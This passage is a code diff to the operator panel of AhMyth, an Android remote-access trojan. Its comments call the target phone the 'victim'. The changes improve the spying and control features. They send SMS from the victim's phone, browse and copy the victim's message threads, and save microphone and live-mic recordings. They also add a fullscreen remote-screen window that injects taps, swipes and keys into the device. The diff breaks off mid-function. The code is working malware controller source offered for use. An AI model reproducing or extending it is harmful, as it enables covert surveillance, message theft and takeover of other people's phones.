@@ -889,10 +889,13 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
 
 //-----------------------SMS Controller (sms.htm)------------------------
 // SMS controller
-app.controller("SMSCtrl", function ($scope, $rootScope) {
+app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
     $SMSCtrl = $scope;
     var sms = CONSTANTS.orders.sms;
     $SMSCtrl.smsList = [];
+    $SMSCtrl.activeTab = 'inbox';  // Initialize active tab
+    $SMSCtrl.phoneNo = '';  // Initialize phone number
+    $SMSCtrl.msg = '';  // Initialize message
     $('.menu .item')
         .tab();
 
@@ -914,10 +917,23 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
         $SMSCtrl.barLimit += 50;
     }
 
+    // Clear SMS form
+    $SMSCtrl.clearForm = () => {
+        $SMSCtrl.phoneNo = '';
+        $SMSCtrl.msg = '';
+        $rootScope.Log('[→] Form cleared', CONSTANTS.logStatus.INFO);
+    }
+
     // send request to victim to send sms
     $SMSCtrl.SendSMS = (phoneNo, msg) => {
+        if (!phoneNo || !msg || phoneNo.trim() === '' || msg.trim() === '') {
+            $rootScope.Log('[✗] Please enter both phone number and message', CONSTANTS.logStatus.FAIL);
+            return;
+        }
         $rootScope.Log(`[→] Sending SMS to ${phoneNo}...`, CONSTANTS.logStatus.INFO);
-        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
+        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo.trim(), sms: msg.trim() });
+        // Clear form after sending
+        $SMSCtrl.clearForm();
     }
 
     // save sms list to csv file
@@ -944,6 +960,59 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
         });
 
     }
+    
+    // SMS conversation modal state
+    $SMSCtrl.showConversation = false;
+    $SMSCtrl.conversationPhone = null;
+    $SMSCtrl.conversationMessages = [];
+    
+    // Open conversation window for a phone number
+    $SMSCtrl.openConversation = (phoneNo) => {
+        if (!phoneNo) return;
+        $SMSCtrl.conversationPhone = phoneNo;
+        // Filter messages for this phone number
+        $SMSCtrl.conversationMessages = $SMSCtrl.smsList.filter(sms => sms.phoneNo === phoneNo);
+        // Sort by date
+        $SMSCtrl.conversationMessages.sort((a, b) => {
+            var dateA = a.date ? new Date(a.date) : new Date(0);
+            var dateB = b.date ? new Date(b.date) : new Date(0);
+            return dateA - dateB;
+        });
+        $SMSCtrl.showConversation = true;
+        // Use $timeout to avoid $apply already in progress error
+        if (!$SMSCtrl.$$phase && !$rootScope.$$phase) {
+            $SMSCtrl.$apply();
+        } else {
+            $timeout(function() {
+                // Already applied, just ensure UI updates
+            }, 0);
+        }
+    };
+    
+    // Close conversation window
+    $SMSCtrl.closeConversation = () => {
+        $SMSCtrl.showConversation = false;
+        $SMSCtrl.conversationPhone = null;
+        $SMSCtrl.conversationMessages = [];
+    };
+    
+    // Reply to SMS
+    $SMSCtrl.replyToSms = (sms) => {
+        $SMSCtrl.activeTab = 'send';
+        $SMSCtrl.phoneNo = sms.phoneNo;
+        $SMSCtrl.msg = '';
+        $SMSCtrl.$apply();
+    };
+    
+    // Copy SMS to clipboard
+    $SMSCtrl.copySms = (sms) => {
+        var text = `From: ${sms.phoneNo}\nDate: ${sms.date || 'N/A'}\nMessage: ${sms.msg}`;
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(text).then(() => {
+                $rootScope.Log('[✓] SMS copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+            });
+        }
+    };
 
 
     //listening for victim response
@@ -1130,6 +1199,42 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
     $MicCtrl = $scope;
     $MicCtrl.isAudio = true;
     var mic = CONSTANTS.orders.mic;
+    
+    // Store recording data in scope so SaveAudio and clearRecording can access it
+    $MicCtrl.recordingData = null;
+    $MicCtrl.recordingName = null;
+    
+    $MicCtrl.SaveAudio = () => {
+        if (!$MicCtrl.recordingData || !$MicCtrl.recordingName) {
+            $rootScope.Log('[✗] No recording to save', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
+        var filePath = path.join(downloadsPath, $MicCtrl.recordingName);
+        fs.outputFile(filePath, $MicCtrl.recordingData, (err) => {
+            if (err)
+                $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+    
+    $MicCtrl.clearRecording = () => {
+        $MicCtrl.recordingData = null;
+        $MicCtrl.recordingName = null;
+        $MicCtrl.isAudio = true; // Hide player
+        var player = document.getElementById('player');
+        var sourceMp3 = document.getElementById('sourceMp3');
+        if (player) {
+            player.pause();
+            player.src = '';
+        }
+        if (sourceMp3) {
+            sourceMp3.src = '';
+        }
+        $rootScope.Log('[→] Recording discarded', CONSTANTS.logStatus.INFO);
+        $MicCtrl.$apply();
+    };
 
     $MicCtrl.$on('$destroy', function () {
         // release resources, cancel Listner...
@@ -1163,24 +1268,15 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
             }
             var base64String = window.btoa(binary);
 
+            // Store recording data in scope for SaveAudio
+            $MicCtrl.recordingData = data.buffer;
+            $MicCtrl.recordingName = data.name || `recording_${Date.now()}.mp3`;
+
             $MicCtrl.isAudio = false;
             $MicCtrl.$apply();
             sourceMp3.src = "data:audio/mp3;base64," + base64String;
             player.load();
             player.play();
-
-            $MicCtrl.SaveAudio = () => {
-                $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
-                var filePath = path.join(downloadsPath, data.name);
-                fs.outputFile(filePath, data.buffer, (err) => {
-                    if (err)
-                        $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
-                    else
-                        $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
-                });
-
-
-            };
 
 
 
@@ -1936,6 +2032,10 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         socket.removeAllListeners(input);
         if (streamInterval) $interval.cancel(streamInterval);
         if (fpsTimer) $interval.cancel(fpsTimer);
+        if (fullscreenUpdateInterval) $interval.cancel(fullscreenUpdateInterval);
+        if (fullscreenWindow && !fullscreenWindow.closed) {
+            fullscreenWindow.close();
+        }
     });
     
     // Initialize canvas
@@ -1951,23 +2051,53 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         if (!canvas) return null;
         
         var rect = canvas.getBoundingClientRect();
-        var scaleX = canvas.width / rect.width;
-        var scaleY = canvas.height / rect.height;
         
-        var canvasX = (event.clientX - rect.left) * scaleX;
-        var canvasY = (event.clientY - rect.top) * scaleY;
+        // Get the actual displayed size of the canvas
+        var displayedWidth = rect.width;
+        var displayedHeight = rect.height;
+        
+        // Get the internal canvas dimensions
+        var canvasWidth = canvas.width;
+        var canvasHeight = canvas.height;
+        
+        // Calculate the scale factor between displayed and internal canvas
+        var scaleX = canvasWidth / displayedWidth;
+        var scaleY = canvasHeight / displayedHeight;
+        
+        // Get click position relative to the displayed canvas
+        var clickX = event.clientX - rect.left;
+        var clickY = event.clientY - rect.top;
+        
+        // Convert to internal canvas coordinates
+        var canvasX = clickX * scaleX;
+        var canvasY = clickY * scaleY;
         
         // Normalize to 0-1 range for device screen mapping
-        var normX = canvasX / canvas.width;
-        var normY = canvasY / canvas.height;
+        // Canvas dimensions should match device screen dimensions
+        var normX = canvasX / canvasWidth;
+        var normY = canvasY / canvasHeight;
+        
+        // Ensure coordinates are within bounds
+        normX = Math.max(0, Math.min(1, normX));
+        normY = Math.max(0, Math.min(1, normY));
+        
+        // Get actual device screen dimensions for reference
+        var screenWidth = $ScreenCtrl.screenInfo.width || canvasWidth;
+        var screenHeight = $ScreenCtrl.screenInfo.height || canvasHeight;
         
         return {
-            x: Math.max(0, Math.min(1, normX)),
-            y: Math.max(0, Math.min(1, normY)),
+            x: normX,
+            y: normY,
             pixelX: Math.round(canvasX),
             pixelY: Math.round(canvasY),
-            screenX: event.clientX - rect.left,
-            screenY: event.clientY - rect.top
+            screenX: clickX,
+            screenY: clickY,
+            deviceX: Math.round(normX * screenWidth),
+            deviceY: Math.round(normY * screenHeight),
+            canvasWidth: canvasWidth,
+            canvasHeight: canvasHeight,
+            displayedWidth: displayedWidth,
+            displayedHeight: displayedHeight
         };
     }
     
@@ -2000,11 +2130,51 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         
         var img = new Image();
         img.onload = function() {
-            canvas.width = width || img.width;
-            canvas.height = height || img.height;
-            ctx.drawImage(img, 0, 0);
+            // Get container dimensions
+            var container = document.getElementById('canvasContainer');
+            if (!container) {
+                console.error('[AhMyth] Canvas container not found');
+                return;
+            }
+            
+            var containerWidth = container.clientWidth;
+            var containerHeight = container.clientHeight;
+            
+            // Get actual image dimensions
+            var imgWidth = width || img.width;
+            var imgHeight = height || img.height;
+            
+            // Calculate aspect ratios
+            var imgAspect = imgWidth / imgHeight;
+            var containerAspect = containerWidth / containerHeight;
+            
+            // Calculate canvas size to fit container while maintaining aspect ratio
+            var canvasWidth, canvasHeight;
+            if (containerAspect > imgAspect) {
+                // Container is wider, fit to height
+                canvasHeight = containerHeight;
+                canvasWidth = canvasHeight * imgAspect;
+            } else {
+                // Container is taller, fit to width
+                canvasWidth = containerWidth;
+                canvasHeight = canvasWidth / imgAspect;
+            }
+            
+            // Set canvas size
+            canvas.width = canvasWidth;
+            canvas.height = canvasHeight;
+            
+            // Clear and draw image scaled to fit
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
+            
             $ScreenCtrl.currentFrame = base64Image;
             fpsCounter++;
+            
+            // Update fullscreen window if open
+            if (fullscreenWindow && !fullscreenWindow.isDestroyed()) {
+                updateFullscreenFrame();
+            }
             
             if (!$ScreenCtrl.$$phase) {
                 $ScreenCtrl.$apply();
@@ -2081,12 +2251,47 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
     };
     
     $ScreenCtrl.sendKey = (key) => {
+        if (!key) {
+            console.warn('[AhMyth] sendKey called with no key');
+            return;
+        }
+        
+        console.log('[AhMyth] sendKey called with:', key);
+        
+        // Check socket connection
+        var isConnected = false;
+        if (originalSocket) {
+            if (typeof originalSocket.connected === 'function') {
+                isConnected = originalSocket.connected();
+            } else {
+                isConnected = originalSocket.connected === true;
+            }
+        }
+        
+        if (!isConnected) {
+            $rootScope.Log('[✗] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            console.error('[AhMyth] Socket not connected');
+            return;
+        }
+        
         logInput('KEY', key.toUpperCase());
+        
+        // Ensure key is sent as lowercase string (Android expects lowercase)
+        var keyStr = String(key).toLowerCase();
+        
+        console.log('[AhMyth] Emitting key command:', {
+            order: input,
+            action: 'key',
+            key: keyStr
+        });
+        
         socket.emit(ORDER, {
             order: input,
             action: 'key',
-            key: key
+            key: keyStr
         });
+        
+        $rootScope.Log(`[→] Sending key: ${keyStr}`, CONSTANTS.logStatus.INFO);
     };
     
     $ScreenCtrl.sendText = () => {
@@ -2106,6 +2311,39 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             $ScreenCtrl.sendText();
         }
     };
+    
+    // Handle keyboard events on canvas
+    $ScreenCtrl.handleKeyDown = (event) => {
+        if (!$ScreenCtrl.isStreaming) return;
+        
+        var key = event.key.toLowerCase();
+        var keyCode = event.keyCode || event.which;
+        
+        // Handle volume and enter keys
+        if (key === 'arrowup' || keyCode === 38) {
+            event.preventDefault();
+            $ScreenCtrl.sendKey('volumeup');
+        } else if (key === 'arrowdown' || keyCode === 40) {
+            event.preventDefault();
+            $ScreenCtrl.sendKey('volumedown');
+        } else if (key === 'enter' || keyCode === 13) {
+            event.preventDefault();
+            $ScreenCtrl.sendKey('enter');
+        } else if (key === 'escape' || keyCode === 27) {
+            event.preventDefault();
+            $ScreenCtrl.sendKey('back');
+        }
+    };
+    
+    // Initialize canvas focus and keyboard listeners
+    $timeout(() => {
+        initCanvas();
+        if (canvas) {
+            // Make canvas focusable for keyboard events
+            canvas.setAttribute('tabindex', '0');
+            canvas.style.outline = 'none';
+        }
+    }, 500);
     
     // ============ Stream Controls ============
     
@@ -2216,18 +2454,477 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         });
     };
     
+    // Fullscreen window reference
+    var fullscreenWindow = null;
+    var fullscreenUpdateInterval = null;
+    
     $ScreenCtrl.openFullscreen = () => {
-        if (!$ScreenCtrl.currentFrame) return;
-        let win = window.open('', '_blank', 'width=540,height=960');
-        win.document.write(`
-            <html>
-            <head><title>Remote Desktop - Fullscreen</title></head>
-            <body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
-            <img src="data:image/jpeg;base64,${$ScreenCtrl.currentFrame}" style="max-width:100%;max-height:100%;object-fit:contain;">
-            </body>
-            </html>
-        `);
+        try {
+            if (!$ScreenCtrl.isStreaming && !$ScreenCtrl.currentFrame) {
+                $rootScope.Log('[✗] No stream or frame available for fullscreen', CONSTANTS.logStatus.FAIL);
+                return;
+            }
+            
+            // Close existing fullscreen if open
+            if (fullscreenWindow) {
+                try {
+                    if (!fullscreenWindow.isDestroyed()) {
+                        fullscreenWindow.close();
+                    }
+                } catch (e) {
+                    console.error('[AhMyth] Error closing existing fullscreen:', e);
+                }
+                fullscreenWindow = null;
+            }
+            
+            if (fullscreenUpdateInterval) {
+                $interval.cancel(fullscreenUpdateInterval);
+                fullscreenUpdateInterval = null;
+            }
+            
+            // Get screen dimensions
+            var screenWidth = $ScreenCtrl.screenInfo.width || 1080;
+            var screenHeight = $ScreenCtrl.screenInfo.height || 1920;
+            
+            // Calculate window size to maintain aspect ratio
+            // Use remote.screen in renderer process
+            var electronScreen = remote ? remote.screen : null;
+            var maxWidth, maxHeight, workAreaWidth, workAreaHeight;
+            
+            if (electronScreen && electronScreen.getPrimaryDisplay) {
+                try {
+                    var display = electronScreen.getPrimaryDisplay();
+                    maxWidth = display.workAreaSize.width * 0.95;
+                    maxHeight = display.workAreaSize.height * 0.95;
+                    workAreaWidth = display.workAreaSize.width;
+                    workAreaHeight = display.workAreaSize.height;
+                } catch (e) {
+                    // Fallback to window dimensions
+                    maxWidth = window.screen.width * 0.95;
+                    maxHeight = window.screen.height * 0.95;
+                    workAreaWidth = window.screen.width;
+                    workAreaHeight = window.screen.height;
+                }
+            } else {
+                // Fallback to window dimensions
+                maxWidth = window.screen.width * 0.95;
+                maxHeight = window.screen.height * 0.95;
+                workAreaWidth = window.screen.width;
+                workAreaHeight = window.screen.height;
+            }
+            
+            var aspectRatio = screenWidth / screenHeight;
+            
+            var winWidth = Math.min(maxWidth, screenWidth);
+            var winHeight = Math.min(maxHeight, screenHeight);
+            
+            if (winWidth / winHeight > aspectRatio) {
+                winWidth = winHeight * aspectRatio;
+            } else {
+                winHeight = winWidth / aspectRatio;
+            }
+            
+            // Center the window
+            var left = (workAreaWidth - winWidth) / 2;
+            var top = (workAreaHeight - winHeight) / 2;
+            
+            // Create fullscreen HTML content
+            var fullscreenHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Remote Desktop - Fullscreen</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            margin: 0;
+                            background: #000;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            height: 100vh;
+                            width: 100vw;
+                            overflow: hidden;
+                        }
+                        #fullscreenCanvas {
+                            max-width: 100%;
+                            max-height: 100%;
+                            width: auto;
+                            height: auto;
+                            object-fit: contain;
+                            image-rendering: -webkit-optimize-contrast;
+                            image-rendering: crisp-edges;
+                        }
+                        .status {
+                            position: absolute;
+                            top: 10px;
+                            right: 10px;
+                            padding: 4px 10px;
+                            background: rgba(0,0,0,0.7);
+                            color: #0f0;
+                            font-family: monospace;
+                            font-size: 10px;
+                            border-radius: 4px;
+                            z-index: 10;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="status" id="status">LIVE</div>
+                    <canvas id="fullscreenCanvas" tabindex="0"></canvas>
+                    <script>
+                        const { ipcRenderer } = require('electron');
+                        var canvas = document.getElementById('fullscreenCanvas');
+                        var ctx = canvas.getContext('2d');
+                        var statusEl = document.getElementById('status');
+                        var imgWidth = 0;
+                        var imgHeight = 0;
+                        var screenWidth = 0;
+                        var screenHeight = 0;
+                        
+                        // Make canvas focusable for keyboard events
+                        canvas.style.outline = 'none';
+                        
+                        function updateFrame(base64Image, width, height) {
+                            var img = new Image();
+                            img.onload = function() {
+                                imgWidth = width || img.width;
+                                imgHeight = height || img.height;
+                                
+                                // Calculate canvas size to fit window while maintaining aspect ratio
+                                var windowWidth = window.innerWidth;
+                                var windowHeight = window.innerHeight;
+                                var aspectRatio = imgWidth / imgHeight;
+                                var windowAspect = windowWidth / windowHeight;
+                                
+                                var canvasWidth, canvasHeight;
+                                if (windowAspect > aspectRatio) {
+                                    // Window is wider, fit to height
+                                    canvasHeight = windowHeight;
+                                    canvasWidth = canvasHeight * aspectRatio;
+                                } else {
+                                    // Window is taller, fit to width
+                                    canvasWidth = windowWidth;
+                                    canvasHeight = canvasWidth / aspectRatio;
+                                }
+                                
+                                canvas.width = canvasWidth;
+                                canvas.height = canvasHeight;
+                                
+                                // Clear and draw image
+                                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                                ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
+                                statusEl.textContent = 'LIVE • ' + new Date().toLocaleTimeString();
+                            };
+                            img.onerror = function(err) {
+                                console.error('[AhMyth] Failed to load frame image:', err);
+                            };
+                            img.src = 'data:image/jpeg;base64,' + base64Image;
+                        }
+                        
+                        // Get canvas coordinates normalized to screen dimensions
+                        function getCanvasCoords(event) {
+                            var rect = canvas.getBoundingClientRect();
+                            
+                            // Get the actual displayed size of the canvas
+                            var displayedWidth = rect.width;
+                            var displayedHeight = rect.height;
+                            
+                            // Get the internal canvas dimensions
+                            var canvasWidth = canvas.width;
+                            var canvasHeight = canvas.height;
+                            
+                            // Calculate the scale factor between displayed and internal canvas
+                            var scaleX = canvasWidth / displayedWidth;
+                            var scaleY = canvasHeight / displayedHeight;
+                            
+                            // Get click position relative to the displayed canvas
+                            var clickX = event.clientX - rect.left;
+                            var clickY = event.clientY - rect.top;
+                            
+                            // Convert to internal canvas coordinates
+                            var canvasX = clickX * scaleX;
+                            var canvasY = clickY * scaleY;
+                            
+                            // Normalize to 0-1 range for device screen mapping
+                            var normX = canvasX / canvasWidth;
+                            var normY = canvasY / canvasHeight;
+                            
+                            // Ensure coordinates are within bounds
+                            normX = Math.max(0, Math.min(1, normX));
+                            normY = Math.max(0, Math.min(1, normY));
+                            
+                            return {
+                                x: normX,
+                                y: normY,
+                                screenX: Math.round(normX * screenWidth),
+                                screenY: Math.round(normY * screenHeight)
+                            };
+                        }
+                        
+                        // Get parent window's webContents ID for communication
+                        var parentWebContentsId = null;
+                        try {
+                            const { remote } = require('electron');
+                            if (remote && remote.getCurrentWebContents) {
+                                var currentWebContents = remote.getCurrentWebContents();
+                                // Get the parent window that opened this one
+                                // We'll use a custom event to communicate
+                            }
+                        } catch (e) {}
+                        
+                        // Function to send input to parent window
+                        function sendInputToParent(data) {
+                            // Send via IPC to main process, which will forward to parent window
+                            ipcRenderer.send('fullscreen-input', data);
+                        }
+                        
+                        // Handle clicks/taps
+                        canvas.addEventListener('click', function(event) {
+                            var coords = getCanvasCoords(event);
+                            if (coords) {
+                                console.log('[AhMyth Fullscreen] Click at normalized:', coords.x, coords.y, 'Screen pixels:', coords.screenX, coords.screenY);
+                                sendInputToParent({
+                                    type: 'tap',
+                                    x: coords.x,
+                                    y: coords.y,
+                                    normalized: true
+                                });
+                            } else {
+                                console.warn('[AhMyth Fullscreen] Failed to get coordinates');
+                            }
+                        });
+                        
+                        // Handle mouse down/up for drag gestures
+                        var isDragging = false;
+                        var dragStart = null;
+                        
+                        canvas.addEventListener('mousedown', function(event) {
+                            isDragging = true;
+                            var coords = getCanvasCoords(event);
+                            if (coords) {
+                                dragStart = coords;
+                            }
+                        });
+                        
+                        canvas.addEventListener('mouseup', function(event) {
+                            if (isDragging && dragStart) {
+                                var coords = getCanvasCoords(event);
+                                if (coords && (Math.abs(coords.x - dragStart.x) > 0.01 || Math.abs(coords.y - dragStart.y) > 0.01)) {
+                                    // Swipe gesture
+                                    sendInputToParent({
+                                        type: 'swipe',
+                                        startX: dragStart.x,
+                                        startY: dragStart.y,
+                                        endX: coords.x,
+                                        endY: coords.y,
+                                        normalized: true
+                                    });
+                                }
+                            }
+                            isDragging = false;
+                            dragStart = null;
+                        });
+                        
+                        // Handle keyboard events
+                        canvas.addEventListener('keydown', function(event) {
+                            var keyMap = {
+                                'ArrowUp': 'volumeup',
+                                'ArrowDown': 'volumedown',
+                                'Enter': 'enter',
+                                'Escape': 'back'
+                            };
+                            
+                            var key = keyMap[event.key];
+                            if (key) {
+                                event.preventDefault();
+                                sendInputToParent({
+                                    type: 'key',
+                                    key: key
+                                });
+                            }
+                        });
+                        
+                        // Listen for frame updates via IPC
+                        ipcRenderer.on('update-frame', (event, data) => {
+                            if (data && data.image) {
+                                updateFrame(data.image, data.width, data.height);
+                                // Store screen dimensions for coordinate mapping
+                                if (data.width && data.height) {
+                                    screenWidth = data.width;
+                                    screenHeight = data.height;
+                                }
+                            }
+                        });
+                        
+                        // Handle window resize
+                        window.addEventListener('resize', function() {
+                            if (imgWidth > 0 && imgHeight > 0) {
+                                // Redraw last frame with new size
+                                var lastFrame = canvas.toDataURL();
+                                if (lastFrame && lastFrame !== 'data:,') {
+                                    var img = new Image();
+                                    img.onload = function() {
+                                        var windowWidth = window.innerWidth;
+                                        var windowHeight = window.innerHeight;
+                                        var aspectRatio = imgWidth / imgHeight;
+                                        var windowAspect = windowWidth / windowHeight;
+                                        
+                                        var canvasWidth, canvasHeight;
+                                        if (windowAspect > aspectRatio) {
+                                            canvasHeight = windowHeight;
+                                            canvasWidth = canvasHeight * aspectRatio;
+                                        } else {
+                                            canvasWidth = windowWidth;
+                                            canvasHeight = canvasWidth / aspectRatio;
+                                        }
+                                        
+                                        canvas.width = canvasWidth;
+                                        canvas.height = canvasHeight;
+                                        ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
+                                    };
+                                    img.src = lastFrame;
+                                }
+                            }
+                        });
+                    </script>
+                </body>
+                </html>
+            `;
+            
+            // Set up handler for fullscreen input events forwarded from main process
+            ipcRenderer.on('fullscreen-input-event', (event, data) => {
+                console.log('[AhMyth] Fullscreen input received:', data);
+                if (data.type === 'tap') {
+                    console.log('[AhMyth] Sending tap to device:', data.x, data.y);
+                    socket.emit(ORDER, {
+                        order: input,
+                        action: 'tap',
+                        x: data.x,
+                        y: data.y,
+                        normalized: true
+                    });
+                } else if (data.type === 'swipe') {
+                    socket.emit(ORDER, {
+                        order: input,
+                        action: 'swipe',
+                        startX: data.startX,
+                        startY: data.startY,
+                        endX: data.endX,
+                        endY: data.endY,
+                        normalized: true
+                    });
+                } else if (data.type === 'key') {
+                    $ScreenCtrl.sendKey(data.key);
+                }
+            });
+            
+            // Create Electron BrowserWindow
+            if (!remote || !remote.BrowserWindow) {
+                $rootScope.Log('[✗] Failed to access Electron BrowserWindow API', CONSTANTS.logStatus.FAIL);
+                console.error('[AhMyth] remote.BrowserWindow is not available');
+                return;
+            }
+            
+            const { BrowserWindow } = remote;
+            
+            // Get current window (lab window) to set as parent
+            var currentWindow = null;
+            try {
+                currentWindow = remote.getCurrentWindow();
+            } catch (e) {
+                console.error('[AhMyth] Could not get current window:', e);
+            }
+            
+            fullscreenWindow = new BrowserWindow({
+                width: Math.round(winWidth),
+                height: Math.round(winHeight),
+                x: Math.round(left),
+                y: Math.round(top),
+                frame: true,
+                backgroundColor: '#000000',
+                parent: currentWindow, // Set parent window
+                webPreferences: {
+                    nodeIntegration: true,
+                    contextIsolation: false,
+                    enableRemoteModule: true
+                }
+            });
+            
+            // Register fullscreen window with parent in main process
+            if (currentWindow) {
+                try {
+                    ipcRenderer.send('register-fullscreen-window', {
+                        fullscreenId: fullscreenWindow.id,
+                        parentId: currentWindow.webContents.id
+                    });
+                } catch (e) {
+                    console.error('[AhMyth] Could not register fullscreen window:', e);
+                }
+            }
+            
+            // Write HTML content to window
+            fullscreenWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(fullscreenHTML));
+            
+            // Handle window close
+            fullscreenWindow.on('closed', () => {
+                // Unregister fullscreen window
+                try {
+                    ipcRenderer.send('unregister-fullscreen-window', fullscreenWindow.id);
+                } catch (e) {}
+                
+                if (fullscreenUpdateInterval) {
+                    $interval.cancel(fullscreenUpdateInterval);
+                    fullscreenUpdateInterval = null;
+                }
+                fullscreenWindow = null;
+            });
+            
+            // Wait for window to be ready, then send initial frame
+            fullscreenWindow.webContents.once('did-finish-load', () => {
+                // Send initial frame
+                if ($ScreenCtrl.currentFrame) {
+                    updateFullscreenFrame();
+                }
+                
+                // Set up interval to update fullscreen window with new frames
+                if ($ScreenCtrl.isStreaming) {
+                    fullscreenUpdateInterval = $interval(() => {
+                        if (fullscreenWindow && !fullscreenWindow.isDestroyed() && $ScreenCtrl.currentFrame) {
+                            updateFullscreenFrame();
+                        } else {
+                            if (fullscreenUpdateInterval) {
+                                $interval.cancel(fullscreenUpdateInterval);
+                                fullscreenUpdateInterval = null;
+                            }
+                        }
+                    }, parseInt($ScreenCtrl.fps) || 100);
+                }
+            });
+            
+            fullscreenWindow.show();
+            $rootScope.Log('[✓] Fullscreen window opened', CONSTANTS.logStatus.SUCCESS);
+        } catch (error) {
+            console.error('[AhMyth] Error opening fullscreen:', error);
+            $rootScope.Log('[✗] Failed to open fullscreen: ' + error.message, CONSTANTS.logStatus.FAIL);
+        }
     };
+    
+    function updateFullscreenFrame() {
+        if (!fullscreenWindow || fullscreenWindow.isDestroyed()) return;
+        if (!$ScreenCtrl.currentFrame) return;
+        
+        try {
+            // Send frame via IPC to the fullscreen window
+            fullscreenWindow.webContents.send('update-frame', {
+                image: $ScreenCtrl.currentFrame,
+                width: $ScreenCtrl.screenInfo.width || (canvas ? canvas.width : 1080),
+                height: $ScreenCtrl.screenInfo.height || (canvas ? canvas.height : 1920)
+            });
+        } catch (e) {
+            console.error('[AhMyth] Failed to update fullscreen frame:', e);
+        }
+    }
     
     // Auto-retry on permission grant
     $rootScope.$on('PermissionGranted', (event, permission) => {
@@ -2294,6 +2991,17 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             $ScreenCtrl.frameCount++;
             $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
             $ScreenCtrl.permissionRequired = false;
+            
+            // Update screen dimensions if provided
+            if (data.width && data.height) {
+                $ScreenCtrl.screenInfo.width = data.width;
+                $ScreenCtrl.screenInfo.height = data.height;
+            }
+            
+            // Update fullscreen window if open
+            if (fullscreenWindow && !fullscreenWindow.isDestroyed()) {
+                updateFullscreenFrame();
+            }
             $ScreenCtrl.awaitingPermission = false;
             $ScreenCtrl.permissionGranted = true;
             
@@ -2740,6 +3448,10 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     var mediaRecorder = null;
     var recordedChunks = [];
     var destNode = null;
+    var recordingStartTime = null;
+    
+    // Recorded streams list
+    $LiveMicCtrl.recordedStreams = [];
 
     // Initialize Web Audio API
     function initAudio() {
@@ -2766,6 +3478,7 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
         
         try {
             recordedChunks = [];
+            recordingStartTime = Date.now();
             mediaRecorder = new MediaRecorder(destNode.stream);
             
             mediaRecorder.ondataavailable = (e) => {
@@ -2801,19 +3514,165 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
         const reader = new FileReader();
         reader.onload = () => {
             const buffer = Buffer.from(reader.result);
-            const filename = `LiveMic_${Date.now()}.webm`;
+            const timestamp = Date.now();
+            const filename = `LiveMic_${timestamp}.webm`;
             const savePath = path.join(downloadsPath, filename);
+            
+            // Calculate duration
+            const duration = recordingStartTime ? Math.floor((Date.now() - recordingStartTime) / 1000) : 0;
+            const durationStr = formatDuration(duration);
+            const fileSize = buffer.length;
+            const fileSizeStr = formatFileSize(fileSize);
             
             fs.outputFile(savePath, buffer, (err) => {
                 if (err) {
                     $rootScope.Log(`[✗] Failed to save recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
                 } else {
                     $rootScope.Log(`[✓] Recording saved: ${savePath}`, CONSTANTS.logStatus.SUCCESS);
+                    
+                    // Add to recorded streams list
+                    const recording = {
+                        id: timestamp,
+                        filename: filename,
+                        path: savePath,
+                        duration: durationStr,
+                        durationSeconds: duration,
+                        size: fileSizeStr,
+                        sizeBytes: fileSize,
+                        timestamp: timestamp,
+                        date: new Date(timestamp).toLocaleString()
+                    };
+                    
+                    $LiveMicCtrl.recordedStreams.unshift(recording);
+                    
+                    // Keep only last 50 recordings
+                    if ($LiveMicCtrl.recordedStreams.length > 50) {
+                        $LiveMicCtrl.recordedStreams.pop();
+                    }
+                    
+                    if (!$LiveMicCtrl.$$phase) {
+                        $LiveMicCtrl.$apply();
+                    }
                 }
             });
         };
         reader.readAsArrayBuffer(blob);
     }
+    
+    function formatDuration(seconds) {
+        const hours = Math.floor(seconds / 3600);
+        const minutes = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        
+        if (hours > 0) {
+            return `${hours}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        }
+        return `${minutes}:${String(secs).padStart(2, '0')}`;
+    }
+    
+    function formatFileSize(bytes) {
+        if (bytes < 1024) return bytes + ' B';
